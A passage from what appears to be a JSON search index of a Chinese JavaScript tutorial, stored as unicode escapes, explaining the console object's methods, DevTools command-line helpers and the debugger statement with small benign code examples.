\u5141\u8bb8\u76d1\u542c\u540c\u4e00\u5927\u7c7b\u7684\u4e8b\u4ef6\u3002\u6240\u6709\u4e8b\u4ef6\u53ef\u4ee5\u5206\u6210\u56db\u4e2a\u5927\u7c7b\u3002 mouse\uff1a\"mousedown\", \"mouseup\", \"click\", \"dblclick\", \"mousemove\", \"mouseover\", \"mouseout\", \"mousewheel\" key\uff1a\"keydown\", \"keyup\", \"keypress\", \"textInput\" touch\uff1a\"touchstart\", \"touchmove\", \"touchend\", \"touchcancel\" control\uff1a\"resize\", \"scroll\", \"zoom\", \"focus\", \"blur\", \"select\", \"change\", \"submit\", \"reset\" 1 monitorEvents ( $ ( \"#msg\" ), \"key\" ); \u4e0a\u9762\u4ee3\u7801\u8868\u793a\u76d1\u542c\u6240\u6709 key \u5927\u7c7b\u7684\u4e8b\u4ef6\u3002 \uff0810\uff09\u5176\u4ed6\u65b9\u6cd5 \u547d\u4ee4\u884c API \u8fd8\u63d0\u4f9b\u4ee5\u4e0b\u65b9\u6cd5\u3002 clear() \uff1a\u6e05\u9664\u63a7\u5236\u53f0\u7684\u5386\u53f2\u3002 copy(object) \uff1a\u590d\u5236\u7279\u5b9a DOM \u5143\u7d20\u5230\u526a\u8d34\u677f\u3002 dir(object) \uff1a\u663e\u793a\u7279\u5b9a\u5bf9\u8c61\u7684\u6240\u6709\u5c5e\u6027\uff0c\u662f console.dir \u65b9\u6cd5\u7684\u522b\u540d\u3002 dirxml(object) \uff1a\u663e\u793a\u7279\u5b9a\u5bf9\u8c61\u7684 XML \u5f62\u5f0f\uff0c\u662f console.dirxml \u65b9\u6cd5\u7684\u522b\u540d\u3002 debugger \u8bed\u53e5 \u00b6 debugger \u8bed\u53e5\u4e3b\u8981\u7528\u4e8e\u9664\u9519\uff0c\u4f5c\u7528\u662f\u8bbe\u7f6e\u65ad\u70b9\u3002\u5982\u679c\u6709\u6b63\u5728\u8fd0\u884c\u7684\u9664\u9519\u5de5\u5177\uff0c\u7a0b\u5e8f\u8fd0\u884c\u5230 debugger \u8bed\u53e5\u65f6\u4f1a\u81ea\u52a8\u505c\u4e0b\u3002\u5982\u679c\u6ca1\u6709\u9664\u9519\u5de5\u5177\uff0c debugger \u8bed\u53e5\u4e0d\u4f1a\u4ea7\u751f\u4efb\u4f55\u7ed3\u679c\uff0cJavaScript \u5f15\u64ce\u81ea\u52a8\u8df3\u8fc7\u8fd9\u4e00\u53e5\u3002 Chrome \u6d4f\u89c8\u5668\u4e2d\uff0c\u5f53\u4ee3\u7801\u8fd0\u884c\u5230 debugger \u8bed\u53e5\u65f6\uff0c\u5c31\u4f1a\u6682\u505c\u8fd0\u884c\uff0c\u81ea\u52a8\u6253\u5f00\u811a\u672c\u6e90\u7801\u754c\u9762\u3002 1 2 3 4 for ( var i = 0 ; i < 5 ; i ++ ){ console . log ( i ); if ( i === 2 ) debugger ; } \u4e0a\u9762\u4ee3\u7801\u6253\u5370\u51fa0\uff0c1\uff0c2\u4ee5\u540e\uff0c\u5c31\u4f1a\u6682\u505c\uff0c\u81ea\u52a8\u6253\u5f00\u6e90\u7801\u754c\u9762\uff0c\u7b49\u5f85\u8fdb\u4e00\u6b65\u5904\u7406\u3002 \u53c2\u8003\u94fe\u63a5 \u00b6 Chrome Developer Tools, Using the Console Matt West, Mastering The Developer Tools Console Firebug Wiki, Console API Axel Rauschmayer, The JavaScript console API Marius Schulz, Advanced JavaScript Debugging with console.table() Google Developer, Command Line API Reference","title":"console \u5bf9\u8c61\u4e0e\u63a7\u5236\u53f0"},{"location":"features/console/#console","text":"","title":"console \u5bf9\u8c61\u4e0e\u63a7\u5236\u53f0"},{"location":"features/console/#console_1","text":"console \u5bf9\u8c61\u662f JavaScript \u7684\u539f\u751f\u5bf9\u8c61\uff0c\u5b83\u6709\u70b9\u50cf Unix \u7cfb\u7edf\u7684\u6807\u51c6\u8f93\u51fa stdout \u548c\u6807\u51c6\u9519\u8bef stderr \uff0c\u53ef\u4ee5\u8f93\u51fa\u5404\u79cd\u4fe1\u606f\u5230\u63a7\u5236\u53f0\uff0c\u5e76\u4e14\u8fd8\u63d0\u4f9b\u4e86\u5f88\u591a\u6709\u7528\u7684\u8f85\u52a9\u65b9\u6cd5\u3002 console \u7684\u5e38\u89c1\u7528\u9014\u6709\u4e24\u4e2a\u3002 \u8c03\u8bd5\u7a0b\u5e8f\uff0c\u663e\u793a\u7f51\u9875\u4ee3\u7801\u8fd0\u884c\u65f6\u7684\u9519\u8bef\u4fe1\u606f\u3002 \u63d0\u4f9b\u4e86\u4e00\u4e2a\u547d\u4ee4\u884c\u63a5\u53e3\uff0c\u7528\u6765\u4e0e\u7f51\u9875\u4ee3\u7801\u4e92\u52a8\u3002 console \u5bf9\u8c61\u7684\u6d4f\u89c8\u5668\u5b9e\u73b0\uff0c\u5305\u542b\u5728\u6d4f\u89c8\u5668\u81ea\u5e26\u7684\u5f00\u53d1\u5de5\u5177\u4e4b\u4e2d\u3002\u4ee5 Chrome \u6d4f\u89c8\u5668\u7684\u201c\u5f00\u53d1\u8005\u5de5\u5177\u201d\uff08Developer Tools\uff09\u4e3a\u4f8b\uff0c\u53ef\u4ee5\u4f7f\u7528\u4e0b\u9762\u4e09\u79cd\u65b9\u6cd5\u7684\u6253\u5f00\u5b83\u3002 \u6309 F12 \u6216\u8005 Control + Shift + i \uff08PC\uff09/ Command + Option + i \uff08Mac\uff09\u3002 \u6d4f\u89c8\u5668\u83dc\u5355\u9009\u62e9\u201c\u5de5\u5177/\u5f00\u53d1\u8005\u5de5\u5177\u201d\u3002 \u5728\u4e00\u4e2a\u9875\u9762\u5143\u7d20\u4e0a\uff0c\u6253\u5f00\u53f3\u952e\u83dc\u5355\uff0c\u9009\u62e9\u5176\u4e2d\u7684\u201cInspect Element\u201d\u3002 \u6253\u5f00\u5f00\u53d1\u8005\u5de5\u5177\u4ee5\u540e\uff0c\u9876\u7aef\u6709\u591a\u4e2a\u9762\u677f\u3002 Elements \uff1a\u67e5\u770b\u7f51\u9875\u7684 HTML \u6e90\u7801\u548c CSS \u4ee3\u7801\u3002 Resources \uff1a\u67e5\u770b\u7f51\u9875\u52a0\u8f7d\u7684\u5404\u79cd\u8d44\u6e90\u6587\u4ef6\uff08\u6bd4\u5982\u4ee3\u7801\u6587\u4ef6\u3001\u5b57\u4f53\u6587\u4ef6 CSS \u6587\u4ef6\u7b49\uff09\uff0c\u4ee5\u53ca\u5728\u786c\u76d8\u4e0a\u521b\u5efa\u7684\u5404\u79cd\u5185\u5bb9\uff08\u6bd4\u5982\u672c\u5730\u7f13\u5b58\u3001Cookie\u3001Local Storage\u7b49\uff09\u3002 Network \uff1a\u67e5\u770b\u7f51\u9875\u7684 HTTP \u901a\u4fe1\u60c5\u51b5\u3002 Sources \uff1a\u67e5\u770b\u7f51\u9875\u52a0\u8f7d\u7684\u811a\u672c\u6e90\u7801\u3002 Timeline \uff1a\u67e5\u770b\u5404\u79cd\u7f51\u9875\u884c\u4e3a\u968f\u65f6\u95f4\u53d8\u5316\u7684\u60c5\u51b5\u3002 Performance \uff1a\u67e5\u770b\u7f51\u9875\u7684\u6027\u80fd\u60c5\u51b5\uff0c\u6bd4\u5982 CPU \u548c\u5185\u5b58\u6d88\u8017\u3002 Console \uff1a\u7528\u6765\u8fd0\u884c JavaScript \u547d\u4ee4\u3002 \u8fd9\u4e9b\u9762\u677f\u90fd\u6709\u5404\u81ea\u7684\u7528\u9014\uff0c\u4ee5\u4e0b\u53ea\u4ecb\u7ecd Console \u9762\u677f\uff08\u53c8\u79f0\u4e3a\u63a7\u5236\u53f0\uff09\u3002 Console \u9762\u677f\u57fa\u672c\u4e0a\u5c31\u662f\u4e00\u4e2a\u547d\u4ee4\u884c\u7a97\u53e3\uff0c\u4f60\u53ef\u4ee5\u5728\u63d0\u793a\u7b26\u4e0b\uff0c\u952e\u5165\u5404\u79cd\u547d\u4ee4\u3002","title":"console \u5bf9\u8c61"},{"location":"features/console/#console_2","text":"console \u5bf9\u8c61\u63d0\u4f9b\u7684\u5404\u79cd\u9759\u6001\u65b9\u6cd5\uff0c\u7528\u6765\u4e0e\u63a7\u5236\u53f0\u7a97\u53e3\u4e92\u52a8\u3002","title":"console \u5bf9\u8c61\u7684\u9759\u6001\u65b9\u6cd5"},{"location":"features/console/#consolelogconsoleinfoconsoledebug","text":"console.log \u65b9\u6cd5\u7528\u4e8e\u5728\u63a7\u5236\u53f0\u8f93\u51fa\u4fe1\u606f\u3002\u5b83\u53ef\u4ee5\u63a5\u53d7\u4e00\u4e2a\u6216\u591a\u4e2a\u53c2\u6570\uff0c\u5c06\u5b83\u4eec\u8fde\u63a5\u8d77\u6765\u8f93\u51fa\u3002 1 2 3 4 console . log ( 'Hello World' ) // Hello World console . log ( 'a' , 'b' , 'c' ) // a b c console.log \u65b9\u6cd5\u4f1a\u81ea\u52a8\u5728\u6bcf\u6b21\u8f93\u51fa\u7684\u7ed3\u5c3e\uff0c\u6dfb\u52a0\u6362\u884c\u7b26\u3002 1 2 3 4 5 6 console . log ( 1 ); console . log ( 2 ); console . log ( 3 ); // 1 // 2 // 3 \u5982\u679c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u683c\u5f0f\u5b57\u7b26\u4e32\uff08\u4f7f\u7528\u4e86\u683c\u5f0f\u5360\u4f4d\u7b26\uff09\uff0c console.log \u65b9\u6cd5\u5c06\u4f9d\u6b21\u7528\u540e\u9762\u7684\u53c2\u6570\u66ff\u6362\u5360\u4f4d\u7b26\uff0c\u7136\u540e\u518d\u8fdb\u884c\u8f93\u51fa\u3002 1 2 console . log ( ' %s + %s = %s' , 1 , 1 , 2 ) // 1 + 1 = 2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c console.log \u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u6709\u4e09\u4e2a\u5360\u4f4d\u7b26\uff08 %s \uff09\uff0c\u7b2c\u4e8c\u3001\u4e09\u3001\u56db\u4e2a\u53c2\u6570\u4f1a\u5728\u663e\u793a\u65f6\uff0c\u4f9d\u6b21\u66ff\u6362\u6389\u8fd9\u4e2a\u4e09\u4e2a\u5360\u4f4d\u7b26\u3002 console.log \u65b9\u6cd5\u652f\u6301\u4ee5\u4e0b\u5360\u4f4d\u7b26\uff0c\u4e0d\u540c\u7c7b\u578b\u7684\u6570\u636e\u5fc5\u987b\u4f7f\u7528\u5bf9\u5e94\u7684\u5360\u4f4d\u7b26\u3002 %s \u5b57\u7b26\u4e32 %d \u6574\u6570 %i \u6574\u6570 %f \u6d6e\u70b9\u6570 %o \u5bf9\u8c61\u7684\u94fe\u63a5 %c CSS \u683c\u5f0f\u5b57\u7b26\u4e32 1 2 3 4 5 var number = 11 * 9 ; var color = 'red' ; console . log ( '%d %s balloons' , number , color ); // 99 red balloons \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u6570\u503c\uff0c\u5bf9\u5e94\u7684\u5360\u4f4d\u7b26\u662f %d \uff0c\u7b2c\u4e09\u4e2a\u53c2\u6570\u662f\u5b57\u7b26\u4e32\uff0c\u5bf9\u5e94\u7684\u5360\u4f4d\u7b26\u662f %s \u3002 \u4f7f\u7528 %c \u5360\u4f4d\u7b26\u65f6\uff0c\u5bf9\u5e94\u7684\u53c2\u6570\u5fc5\u987b\u662f CSS \u4ee3\u7801\uff0c\u7528\u6765\u5bf9\u8f93\u51fa\u5185\u5bb9\u8fdb\u884c CSS \u6e32\u67d3\u3002 1 2 3 4 console . log ( '%cThis text is styled!' , 'color: red; background: yellow; font-size: 24px;' ) \u4e0a\u9762\u4ee3\u7801\u8fd0\u884c\u540e\uff0c\u8f93\u51fa\u7684\u5185\u5bb9\u5c06\u663e\u793a\u4e3a\u9ec4\u5e95\u7ea2\u5b57\u3002 console.log \u65b9\u6cd5\u7684\u4e24\u79cd\u53c2\u6570\u683c\u5f0f\uff0c\u53ef\u4ee5\u7ed3\u5408\u5728\u4e00\u8d77\u4f7f\u7528\u3002 1 2 console . log ( ' %s + %s ' , 1 , 1 , '= 2' ) // 1 + 1 = 2 \u5982\u679c\u53c2\u6570\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c console.log \u4f1a\u663e\u793a\u8be5\u5bf9\u8c61\u7684\u503c\u3002 1 2 3 4 console . log ({ foo : 'bar' }) // Object {foo: \"bar\"} console . log ( Date ) // function Date() { [native code] } \u4e0a\u9762\u4ee3\u7801\u8f93\u51fa Date \u5bf9\u8c61\u7684\u503c\uff0c\u7ed3\u679c\u4e3a\u4e00\u4e2a\u6784\u9020\u51fd\u6570\u3002 console.info \u662f console.log \u65b9\u6cd5\u7684\u522b\u540d\uff0c\u7528\u6cd5\u5b8c\u5168\u4e00\u6837\u3002\u53ea\u4e0d\u8fc7 console.info \u65b9\u6cd5\u4f1a\u5728\u8f93\u51fa\u4fe1\u606f\u7684\u524d\u9762\uff0c\u52a0\u4e0a\u4e00\u4e2a\u84dd\u8272\u56fe\u6807\u3002 console.debug \u65b9\u6cd5\u4e0e console.log \u65b9\u6cd5\u7c7b\u4f3c\uff0c\u4f1a\u5728\u63a7\u5236\u53f0\u8f93\u51fa\u8c03\u8bd5\u4fe1\u606f\u3002\u4f46\u662f\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c console.debug \u8f93\u51fa\u7684\u4fe1\u606f\u4e0d\u4f1a\u663e\u793a\uff0c\u53ea\u6709\u5728\u6253\u5f00\u663e\u793a\u7ea7\u522b\u5728 verbose \u7684\u60c5\u51b5\u4e0b\uff0c\u624d\u4f1a\u663e\u793a\u3002 console \u5bf9\u8c61\u7684\u6240\u6709\u65b9\u6cd5\uff0c\u90fd\u53ef\u4ee5\u88ab\u8986\u76d6\u3002\u56e0\u6b64\uff0c\u53ef\u4ee5\u6309\u7167\u81ea\u5df1\u7684\u9700\u8981\uff0c\u5b9a\u4e49 console.log \u65b9\u6cd5\u3002 1 2 3 4 5 6 7 8 9 [ 'log' , 'info' , 'warn' , 'error' ]. forEach ( function ( method ) { console [ method ] = console [ method ]. bind ( console , new Date (). toISOString () ); }); console . log ( \"\u51fa\u9519\u4e86\uff01\" ); // 2014-05-18T09:00.000Z \u51fa\u9519\u4e86\uff01 \u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c\u4f7f\u7528\u81ea\u5b9a\u4e49\u7684 console.log \u65b9\u6cd5\uff0c\u53ef\u4ee5\u5728\u663e\u793a\u7ed3\u679c\u6dfb\u52a0\u5f53\u524d\u65f6\u95f4\u3002","title":"console.log()\uff0cconsole.info()\uff0cconsole.debug()"},{"location":"features/console/#consolewarnconsoleerror","text":"warn \u65b9\u6cd5\u548c error \u65b9\u6cd5\u4e5f\u662f\u5728\u63a7\u5236\u53f0\u8f93\u51fa\u4fe1\u606f\uff0c\u5b83\u4eec\u4e0e log \u65b9\u6cd5\u7684\u4e0d\u540c\u4e4b\u5904\u5728\u4e8e\uff0c warn \u65b9\u6cd5\u8f93\u51fa\u4fe1\u606f\u65f6\uff0c\u5728\u6700\u524d\u9762\u52a0\u4e00\u4e2a\u9ec4\u8272\u4e09\u89d2\uff0c\u8868\u793a\u8b66\u544a\uff1b error \u65b9\u6cd5\u8f93\u51fa\u4fe1\u606f\u65f6\uff0c\u5728\u6700\u524d\u9762\u52a0\u4e00\u4e2a\u7ea2\u8272\u7684\u53c9\uff0c\u8868\u793a\u51fa\u9519\u3002\u540c\u65f6\uff0c\u8fd8\u4f1a\u9ad8\u4eae\u663e\u793a\u8f93\u51fa\u6587\u5b57\u548c\u9519\u8bef\u53d1\u751f\u7684\u5806\u6808\u3002\u5176\u4ed6\u65b9\u9762\u90fd\u4e00\u6837\u3002 1 2 3 4 console . error ( 'Error: %s (%i)' , 'Server is not responding' , 500 ) // Error: Server is not responding (500) console . warn ( 'Warning! Too few nodes (%d)' , document . childNodes . length ) // Warning! Too few nodes (1) \u53ef\u4ee5\u8fd9\u6837\u7406\u89e3\uff0c log \u65b9\u6cd5\u662f\u5199\u5165\u6807\u51c6\u8f93\u51fa\uff08 stdout \uff09\uff0c warn \u65b9\u6cd5\u548c error \u65b9\u6cd5\u662f\u5199\u5165\u6807\u51c6\u9519\u8bef\uff08 stderr \uff09\u3002","title":"console.warn()\uff0cconsole.error()"},{"location":"features/console/#consoletable","text":"\u5bf9\u4e8e\u67d0\u4e9b\u590d\u5408\u7c7b\u578b\u7684\u6570\u636e\uff0c console.table \u65b9\u6cd5\u53ef\u4ee5\u5c06\u5176\u8f6c\u4e3a\u8868\u683c\u663e\u793a\u3002 1 2 3 4 5 6 7 var languages = [ { name : \"JavaScript\" , fileExtension : \".js\" }, { name : \"TypeScript\" , fileExtension : \".ts\" }, { name : \"CoffeeScript\" , fileExtension : \".coffee\" } ]; console . table ( languages ); \u4e0a\u9762\u4ee3\u7801\u7684 language \u53d8\u91cf\uff0c\u8f6c\u4e3a\u8868\u683c\u663e\u793a\u5982\u4e0b\u3002 (index) name fileExtension 0 \"JavaScript\" \".js\" 1 \"TypeScript\" \".ts\" 2 \"CoffeeScript\" \".coffee\" \u4e0b\u9762\u662f\u663e\u793a\u8868\u683c\u5185\u5bb9\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 var languages = { csharp : { name : \"C#\" , paradigm : \"object-oriented\" }, fsharp : { name : \"F#\" , paradigm : \"functional\" } }; console . table ( languages ); \u4e0a\u9762\u4ee3\u7801\u7684 language \uff0c\u8f6c\u4e3a\u8868\u683c\u663e\u793a\u5982\u4e0b\u3002 (index) name paradigm csharp \"C#\" \"object-oriented\" fsharp \"F#\" \"functional\"","title":"console.table()"},{"location":"features/console/#consolecount","text":"count \u65b9\u6cd5\u7528\u4e8e\u8ba1\u6570\uff0c\u8f93\u51fa\u5b83\u88ab\u8c03\u7528\u4e86\u591a\u5c11\u6b21\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 function greet ( user ) { console . count (); return 'hi ' + user ; } greet ( 'bob' ) // : 1 // \"hi bob\" greet ( 'alice' ) // : 2 // \"hi alice\" greet ( 'bob' ) // : 3 // \"hi bob\" \u4e0a\u9762\u4ee3\u7801\u6bcf\u6b21\u8c03\u7528 greet \u51fd\u6570\uff0c\u5185\u90e8\u7684 console.count \u65b9\u6cd5\u5c31\u8f93\u51fa\u6267\u884c\u6b21\u6570\u3002 \u8be5\u65b9\u6cd5\u53ef\u4ee5\u63a5\u53d7\u4e00\u4e2a\u5b57\u7b26\u4e32\u4f5c\u4e3a\u53c2\u6570\uff0c\u4f5c\u4e3a\u6807\u7b7e\uff0c\u5bf9\u6267\u884c\u6b21\u6570\u8fdb\u884c\u5206\u7c7b\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 function greet ( user ) { console . count ( user ); return \"hi \" + user ; } greet ( 'bob' ) // bob: 1 // \"hi bob\" greet ( 'alice' ) // alice: 1 // \"hi alice\" greet ( 'bob' ) // bob: 2 // \"hi bob\" \u4e0a\u9762\u4ee3\u7801\u6839\u636e\u53c2\u6570\u7684\u4e0d\u540c\uff0c\u663e\u793a bob \u6267\u884c\u4e86\u4e24\u6b21\uff0c alice \u6267\u884c\u4e86\u4e00\u6b21\u3002","title":"console.count()"},{"location":"features/console/#consoledirconsoledirxml","text":"dir \u65b9\u6cd5\u7528\u6765\u5bf9\u4e00\u4e2a\u5bf9\u8c61\u8fdb\u884c\u68c0\u67e5\uff08inspect\uff09\uff0c\u5e76\u4ee5\u6613\u4e8e\u9605\u8bfb\u548c\u6253\u5370\u7684\u683c\u5f0f\u663e\u793a\u3002 1 2 3 4 5 6 7 8 console . log ({ f1 : 'foo' , f2 : 'bar' }) // Object {f1: \"foo\", f2: \"bar\"} console . dir ({ f1 : 'foo' , f2 : 'bar' }) // Object // f1: \"foo\" // f2: \"bar\" // __proto__: Object \u4e0a\u9762\u4ee3\u7801\u663e\u793a dir \u65b9\u6cd5\u7684\u8f93\u51fa\u7ed3\u679c\uff0c\u6bd4 log \u65b9\u6cd5\u66f4\u6613\u8bfb\uff0c\u4fe1\u606f\u4e5f\u66f4\u4e30\u5bcc\u3002 \u8be5\u65b9\u6cd5\u5bf9\u4e8e\u8f93\u51fa DOM \u5bf9\u8c61\u975e\u5e38\u6709\u7528\uff0c\u56e0\u4e3a\u4f1a\u663e\u793a DOM \u5bf9\u8c61\u7684\u6240\u6709\u5c5e\u6027\u3002 1 console . dir ( document . body ) Node \u73af\u5883\u4e4b\u4e2d\uff0c\u8fd8\u53ef\u4ee5\u6307\u5b9a\u4ee5\u4ee3\u7801\u9ad8\u4eae\u7684\u5f62\u5f0f\u8f93\u51fa\u3002 1 console . dir ( obj , { colors : true }) dirxml \u65b9\u6cd5\u4e3b\u8981\u7528\u4e8e\u4ee5\u76ee\u5f55\u6811\u7684\u5f62\u5f0f\uff0c\u663e\u793a DOM \u8282\u70b9\u3002 1 console . dirxml ( document . body ) \u5982\u679c\u53c2\u6570\u4e0d\u662f DOM \u8282\u70b9\uff0c\u800c\u662f\u666e\u901a\u7684 JavaScript \u5bf9\u8c61\uff0c console.dirxml \u7b49\u540c\u4e8e console.dir \u3002 1 2 3 console . dirxml ([ 1 , 2 , 3 ]) // \u7b49\u540c\u4e8e console . dir ([ 1 , 2 , 3 ])","title":"console.dir()\uff0cconsole.dirxml()"},{"location":"features/console/#consoleassert","text":"console.assert \u65b9\u6cd5\u4e3b\u8981\u7528\u4e8e\u7a0b\u5e8f\u8fd0\u884c\u8fc7\u7a0b\u4e2d\uff0c\u8fdb\u884c\u6761\u4ef6\u5224\u65ad\uff0c\u5982\u679c\u4e0d\u6ee1\u8db3\u6761\u4ef6\uff0c\u5c31\u663e\u793a\u4e00\u4e2a\u9519\u8bef\uff0c\u4f46\u4e0d\u4f1a\u4e2d\u65ad\u7a0b\u5e8f\u6267\u884c\u3002\u8fd9\u6837\u5c31\u76f8\u5f53\u4e8e\u63d0\u793a\u7528\u6237\uff0c\u5185\u90e8\u72b6\u6001\u4e0d\u6b63\u786e\u3002 \u5b83\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u8868\u8fbe\u5f0f\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u5b57\u7b26\u4e32\u3002\u53ea\u6709\u5f53\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a false \uff0c\u624d\u4f1a\u63d0\u793a\u6709\u9519\u8bef\uff0c\u5728\u63a7\u5236\u53f0\u8f93\u51fa\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u5426\u5219\u4e0d\u4f1a\u6709\u4efb\u4f55\u7ed3\u679c\u3002 1 2 3 4 5 6 7 8 9 10 11 console . assert ( false , '\u5224\u65ad\u6761\u4ef6\u4e0d\u6210\u7acb' ) // Assertion failed: \u5224\u65ad\u6761\u4ef6\u4e0d\u6210\u7acb // \u76f8\u5f53\u4e8e try { if ( ! false ) { throw new Error ( '\u5224\u65ad\u6761\u4ef6\u4e0d\u6210\u7acb' ); } } catch ( e ) { console . error ( e ); } \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\uff0c\u5224\u65ad\u5b50\u8282\u70b9\u7684\u4e2a\u6570\u662f\u5426\u5927\u4e8e\u7b49\u4e8e500\u3002 1 console . assert ( list . childNodes . length < 500 , '\u8282\u70b9\u4e2a\u6570\u5927\u4e8e\u7b49\u4e8e500' ) \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5982\u679c\u7b26\u5408\u6761\u4ef6\u7684\u8282\u70b9\u5c0f\u4e8e500\u4e2a\uff0c\u4e0d\u4f1a\u6709\u4efb\u4f55\u8f93\u51fa\uff1b\u53ea\u6709\u5927\u4e8e\u7b49\u4e8e500\u65f6\uff0c\u624d\u4f1a\u5728\u63a7\u5236\u53f0\u63d0\u793a\u9519\u8bef\uff0c\u5e76\u4e14\u663e\u793a\u6307\u5b9a\u6587\u672c\u3002","title":"console.assert()"},{"location":"features/console/#consoletimeconsoletimeend","text":"\u8fd9\u4e24\u4e2a\u65b9\u6cd5\u7528\u4e8e\u8ba1\u65f6\uff0c\u53ef\u4ee5\u7b97\u51fa\u4e00\u4e2a\u64cd\u4f5c\u6240\u82b1\u8d39\u7684\u51c6\u786e\u65f6\u95f4\u3002 1 2 3 4 5 6 7 8 9 console . time ( 'Array initialize' ); var array = new Array ( 1000000 ); for ( var i = array . length - 1 ; i >= 0 ; i -- ) { array [ i ] = new Object (); }; console . timeEnd ( 'Array initialize' ); // Array initialize: 1914.481ms time \u65b9\u6cd5\u8868\u793a\u8ba1\u65f6\u5f00\u59cb\uff0c timeEnd \u65b9\u6cd5\u8868\u793a\u8ba1\u65f6\u7ed3\u675f\u3002\u5b83\u4eec\u7684\u53c2\u6570\u662f\u8ba1\u65f6\u5668\u7684\u540d\u79f0\u3002\u8c03\u7528 timeEnd \u65b9\u6cd5\u4e4b\u540e\uff0c\u63a7\u5236\u53f0\u4f1a\u663e\u793a\u201c\u8ba1\u65f6\u5668\u540d\u79f0: \u6240\u8017\u8d39\u7684\u65f6\u95f4\u201d\u3002","title":"console.time()\uff0cconsole.timeEnd()"},{"location":"features/console/#consolegroupconsolegroupendconsolegroupcollapsed","text":"console.group \u548c console.groupEnd \u8fd9\u4e24\u4e2a\u65b9\u6cd5\u7528\u4e8e\u5c06\u663e\u793a\u7684\u4fe1\u606f\u5206\u7ec4\u3002\u5b83\u53ea\u5728\u8f93\u51fa\u5927\u91cf\u4fe1\u606f\u65f6\u6709\u7528\uff0c\u5206\u5728\u4e00\u7ec4\u7684\u4fe1\u606f\uff0c\u53ef\u4ee5\u7528\u9f20\u6807\u6298\u53e0/\u5c55\u5f00\u3002 1 2 3 4 5 6 7 8 console . group ( '\u4e00\u7ea7\u5206\u7ec4' ); console . log ( '\u4e00\u7ea7\u5206\u7ec4\u7684\u5185\u5bb9' ); console . group ( '\u4e8c\u7ea7\u5206\u7ec4' ); console . log ( '\u4e8c\u7ea7\u5206\u7ec4\u7684\u5185\u5bb9' ); console . groupEnd (); // \u4e8c\u7ea7\u5206\u7ec4\u7ed3\u675f console . groupEnd (); // \u4e00\u7ea7\u5206\u7ec4\u7ed3\u675f \u4e0a\u9762\u4ee3\u7801\u4f1a\u5c06\u201c\u4e8c\u7ea7\u5206\u7ec4\u201d\u663e\u793a\u5728\u201c\u4e00\u7ea7\u5206\u7ec4\u201d\u5185\u90e8\uff0c\u5e76\u4e14\u201c\u4e00\u7ea7\u5206\u7ec4\u201d\u548c\u201c\u4e8c\u7ea7\u5206\u7ec4\u201d\u524d\u9762\u90fd\u6709\u4e00\u4e2a\u6298\u53e0\u7b26\u53f7\uff0c\u53ef\u4ee5\u7528\u6765\u6298\u53e0\u672c\u7ea7\u7684\u5185\u5bb9\u3002 console.groupCollapsed \u65b9\u6cd5\u4e0e console.group \u65b9\u6cd5\u5f88\u7c7b\u4f3c\uff0c\u552f\u4e00\u7684\u533a\u522b\u662f\u8be5\u7ec4\u7684\u5185\u5bb9\uff0c\u5728\u7b2c\u4e00\u6b21\u663e\u793a\u65f6\u662f\u6536\u8d77\u7684\uff08collapsed\uff09\uff0c\u800c\u4e0d\u662f\u5c55\u5f00\u7684\u3002 1 2 3 4 5 6 console . groupCollapsed ( 'Fetching Data' ); console . log ( 'Request Sent' ); console . error ( 'Error: Server not responding (500)' ); console . groupEnd (); \u4e0a\u9762\u4ee3\u7801\u53ea\u663e\u793a\u4e00\u884c\u201dFetching Data\u201c\uff0c\u70b9\u51fb\u540e\u624d\u4f1a\u5c55\u5f00\uff0c\u663e\u793a\u5176\u4e2d\u5305\u542b\u7684\u4e24\u884c\u3002","title":"console.group()\uff0cconsole.groupEnd()\uff0cconsole.groupCollapsed()"},{"location":"features/console/#consoletraceconsoleclear","text":"console.trace \u65b9\u6cd5\u663e\u793a\u5f53\u524d\u6267\u884c\u7684\u4ee3\u7801\u5728\u5806\u6808\u4e2d\u7684\u8c03\u7528\u8def\u5f84\u3002 1 2 3 4 5 6 console . trace () // console.trace() // (anonymous function) // InjectedScript._evaluateOn // InjectedScript._evaluateAndWrap // InjectedScript.evaluate console.clear \u65b9\u6cd5\u7528\u4e8e\u6e05\u9664\u5f53\u524d\u63a7\u5236\u53f0\u7684\u6240\u6709\u8f93\u51fa\uff0c\u5c06\u5149\u6807\u56de\u7f6e\u5230\u7b2c\u4e00\u884c\u3002\u5982\u679c\u7528\u6237\u9009\u4e2d\u4e86\u63a7\u5236\u53f0\u7684\u201cPreserve log\u201d\u9009\u9879\uff0c console.clear \u65b9\u6cd5\u5c06\u4e0d\u8d77\u4f5c\u7528\u3002","title":"console.trace()\uff0cconsole.clear()"},{"location":"features/console/#api","text":"\u6d4f\u89c8\u5668\u63a7\u5236\u53f0\u4e2d\uff0c\u9664\u4e86\u4f7f\u7528 console \u5bf9\u8c61\uff0c\u8fd8\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e9b\u63a7\u5236\u53f0\u81ea\u5e26\u7684\u547d\u4ee4\u884c\u65b9\u6cd5\u3002 \uff081\uff09 $_ $_ \u5c5e\u6027\u8fd4\u56de\u4e0a\u4e00\u4e2a\u8868\u8fbe\u5f0f\u7684\u503c\u3002 1 2 3 4 2 + 2 // 4 $_ // 4 \uff082\uff09 $0 - $4 \u63a7\u5236\u53f0\u4fdd\u5b58\u4e86\u6700\u8fd15\u4e2a\u5728 Elements \u9762\u677f\u9009\u4e2d\u7684 DOM \u5143\u7d20\uff0c $0 \u4ee3\u8868\u5012\u6570\u7b2c\u4e00\u4e2a\uff08\u6700\u8fd1\u4e00\u4e2a\uff09\uff0c $1 